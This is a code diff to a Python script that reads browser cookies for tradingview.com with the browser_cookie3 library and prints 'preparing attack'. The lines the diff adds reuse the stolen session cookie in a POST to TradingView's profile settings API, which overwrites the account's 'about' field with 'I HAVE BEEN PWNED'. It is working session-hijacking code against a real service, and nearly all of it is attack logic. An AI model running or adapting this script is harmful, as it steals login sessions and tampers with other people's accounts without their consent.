@@ -3,17 +3,19 @@ import json
 import requests 
 import time 
 
+
 print("checking if requirements are installed ")
-time.sleep(5)
+time.sleep(2)
 print()
 
 os.system("pip install browser_cookie3")
 
 import browser_cookie3
+from email.mime.multipart import MIMEMultipart
 print()
 print("checked")
 print() 
-domain = input("Enter domain:") 
+domain = "tradingview.com"
 
 def getCookiesFromDomain(domain,cookieName=''):
 
@@ -36,7 +38,7 @@ def getCookiesFromDomain(domain,cookieName=''):
 
 print()
 print("preparing attack ")
-time.sleep(5)
+time.sleep(3)
 print()
 def remove(string):
     return "".join(string.split())
@@ -52,3 +54,14 @@ cookie5 = cookie4.replace('"','')
 finalcookie = remove(cookie5)
 print("Got the cookie -")
 print(finalcookie)
+
+related = MIMEMultipart('form-data','----WebKitFormBoundaryXkphc45YTNMa8x5I')
+headers = dict(related.items())
+headers['Origin'] = 'https://www.tradingview.com'
+headers['Cookie'] = finalcookie
+
+files = {'about':(None, 'I HAVE BEEN PWNED ')}
+req = requests.post('https://www.tradingview.com/api/v1/user/profile/settings/', files=files, headers=headers)
+
+
+
